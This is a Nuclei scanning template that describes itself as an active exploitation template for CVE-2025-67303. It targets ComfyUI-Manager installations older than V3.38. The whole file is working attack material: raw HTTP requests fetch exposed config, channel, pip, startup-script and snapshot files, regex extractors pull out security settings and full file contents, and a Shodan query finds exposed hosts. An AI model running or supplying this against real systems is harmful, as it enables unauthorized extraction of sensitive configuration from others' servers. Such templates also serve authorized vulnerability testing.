id: CVE-2025-67303

info:
  name: ComfyUI-Manager < V3.38 - Configuration Data Extraction
  author: YAshhh29
  severity: critical
  description: |
    Active exploitation template for CVE-2025-67303. This template extracts sensitive configuration data
    from vulnerable ComfyUI-Manager installations (< V3.38) where files are stored in an unprotected
    location accessible via the web interface. Successfully retrieves security settings, channel
    configurations, and snapshot information.

    WARNING: This is an active exploitation template. Use only on authorized targets.
  reference:
    - https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md
    - https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26
    - https://nvd.nist.gov/vuln/detail/CVE-2025-67303
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2025-67303
    cwe-id: CWE-420
  metadata:
    verified: true
    max-request: 6
    shodan-query: http.title:"ComfyUI"
    nvd-published: 2026-01-05
  tags: cve,cve2025,comfyui,comfyui-manager,exploit,config-extraction,unprotected-channel

variables:
  base_path: "user/default/ComfyUI-Manager"

http:
  - raw:
      - |
        GET /{{base_path}}/config.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

      - |
        GET /{{base_path}}/channels.list HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

      - |
        GET /{{base_path}}/pip_overrides.json HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

      - |
        GET /{{base_path}}/pip_blacklist.list HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

      - |
        GET /{{base_path}}/startup-scripts/install-scripts.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

      - |
        GET /{{base_path}}/snapshots/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: */*
        Connection: close

    stop-at-first-match: false
    req-condition: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: config-ini-exposed
        dsl:
          - "status_code_1 == 200"
          - 'contains(body_1, "[default]")'
          - 'contains(body_1, "security_level")'
        condition: and

      - type: dsl
        name: channels-list-exposed
        dsl:
          - "status_code_2 == 200"
          - 'contains(body_2, "channel_url") || contains(body_2, "custom_node")'
        condition: and

      - type: dsl
        name: pip-overrides-exposed
        dsl:
          - "status_code_3 == 200"
          - 'contains(body_3, "{") || contains(body_3, "package")'
        condition: and

      - type: dsl
        name: startup-scripts-exposed
        dsl:
          - "status_code_5 == 200"
          - "len(body_5) > 0"
        condition: and

      - type: dsl
        name: snapshots-directory-exposed
        dsl:
          - "status_code_6 == 200"
          - 'contains(body_6, "Index of") || contains(body_6, ".json")'
        condition: and

    extractors:
      - type: regex
        name: security_level
        part: body_1
        group: 1
        regex:
          - 'security_level\s*=\s*(\w+)'

      - type: regex
        name: preview_method
        part: body_1
        group: 1
        regex:
          - 'preview_method\s*=\s*(\w+)'

      - type: regex
        name: badge_mode
        part: body_1
        group: 1
        regex:
          - 'badge_mode\s*=\s*(\w+)'

      - type: regex
        name: git_exe
        part: body_1
        group: 1
        regex:
          - 'git_exe\s*=\s*(.+)'

      - type: regex
        name: channel_urls
        part: body_2
        regex:
          - 'https?://[^\s\n]+'

      - type: regex
        name: pip_packages
        part: body_3
        regex:
          - '"([^"]+)"\s*:\s*"([^"]+)"'

      - type: regex
        name: startup_scripts
        part: body_5
        regex:
          - ".+"

      - type: regex
        name: snapshot_files
        part: body_6
        regex:
          - '[\w\-]+\.json'

      - type: kval
        name: full_config
        part: body_1
        kval:
          - body_1

      - type: kval
        name: full_channels
        part: body_2
        kval:
          - body_2
